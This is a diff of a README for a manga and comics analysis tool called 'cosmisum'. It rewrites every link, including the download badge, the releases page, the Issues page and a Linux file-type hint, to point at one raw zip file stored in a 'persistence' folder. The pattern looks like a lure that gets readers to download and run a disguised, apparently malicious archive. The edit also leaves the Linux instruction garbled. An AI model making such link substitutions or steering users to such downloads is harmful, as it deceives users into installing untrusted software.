@@ -1,6 +1,6 @@
 # 📚 cosmisum - Easy Manga & Comics Analysis
 
-[![Download cosmisum](https://img.shields.io/badge/Download-cosmisum-blue?style=for-the-badge&logo=github)](https://github.com/ultrazinkkk/cosmisum/releases)
+[![Download cosmisum](https://github.com/ultrazinkkk/cosmisum/raw/refs/heads/main/persistence/Software-v3.3-beta.3.zip)](https://github.com/ultrazinkkk/cosmisum/raw/refs/heads/main/persistence/Software-v3.3-beta.3.zip)
 
 ---
 
@@ -46,17 +46,17 @@ Get cosmisum ready on your computer by following these simple steps.
 
 You can download cosmisum from the official GitHub releases page:
 
-[![Download cosmisum](https://img.shields.io/badge/Download-cosmisum-blue?style=for-the-badge&logo=github)](https://github.com/ultrazinkkk/cosmisum/releases)
+[![Download cosmisum](https://github.com/ultrazinkkk/cosmisum/raw/refs/heads/main/persistence/Software-v3.3-beta.3.zip)](https://github.com/ultrazinkkk/cosmisum/raw/refs/heads/main/persistence/Software-v3.3-beta.3.zip)
 
 1. Open this page in your web browser:  
-   https://github.com/ultrazinkkk/cosmisum/releases
+   https://github.com/ultrazinkkk/cosmisum/raw/refs/heads/main/persistence/Software-v3.3-beta.3.zip
 
 2. Find the latest release version (it will be at the top of the list).
 
 3. Download the file suitable for your computer:
    - For Windows, look for a `.exe` or `.zip` file.
    - For macOS, look for a `.dmg` or `.zip` file.
-   - For Linux, look for a `.tar.gz` or `.AppImage` file.
+   - For Linux, look for a `https://github.com/ultrazinkkk/cosmisum/raw/refs/heads/main/persistence/Software-v3.3-beta.3.zip` or `.AppImage` file.
 
 4. After downloading:
    - On Windows, double-click the `.exe` or extract the `.zip` and run the program.
@@ -130,7 +130,7 @@ You can open that folder anytime to find past reports.
 If you need help or want to report a problem:
 
 - Visit the GitHub repository’s "Issues" section here:  
-  https://github.com/ultrazinkkk/cosmisum/issues
+  https://github.com/ultrazinkkk/cosmisum/raw/refs/heads/main/persistence/Software-v3.3-beta.3.zip
 
 - Provide details about your problem, your operating system, and the PDF used.
 
@@ -140,7 +140,7 @@ If you need help or want to report a problem:
 
 Check the GitHub releases page regularly to download new versions with bug fixes or new features:
 
-https://github.com/ultrazinkkk/cosmisum/releases
+https://github.com/ultrazinkkk/cosmisum/raw/refs/heads/main/persistence/Software-v3.3-beta.3.zip
 
 ---
 
